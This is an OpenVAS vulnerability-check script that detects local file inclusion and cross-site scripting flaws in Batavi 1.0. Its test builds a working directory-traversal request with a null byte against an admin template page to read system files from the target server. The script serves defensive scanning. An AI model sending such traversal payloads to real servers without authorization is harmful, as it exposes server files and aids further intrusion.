###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_batavi_46467.nasl 13 2013-10-27 12:16:33Z jan $
#
# Batavi Multiple Local File Include and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Batavi is prone to multiple local file-include and cross-site
scripting vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker can exploit the local file-include vulnerabilities using
directory-traversal strings to view and execute local files within the
context of the affected application. Information harvested may aid in
further attacks.

The attacker may leverage the cross-site scripting issues to execute
arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-
based authentication credentials and launch other attacks.

Batavi 1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103087);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-02-22 13:26:53 +0100 (Tue, 22 Feb 2011)");
 script_bugtraq_id(46467);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Batavi Multiple Local File Include and Cross Site Scripting Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46467");
 script_xref(name : "URL" , value : "http://www.batavi.org/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if Batavi is prone to a local file-include vulnerabillity");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_batavi_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"batavi"))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/admin/templates/pages/templates_boxes/info.php?module=",crap(data:"../",length:6*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url, pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
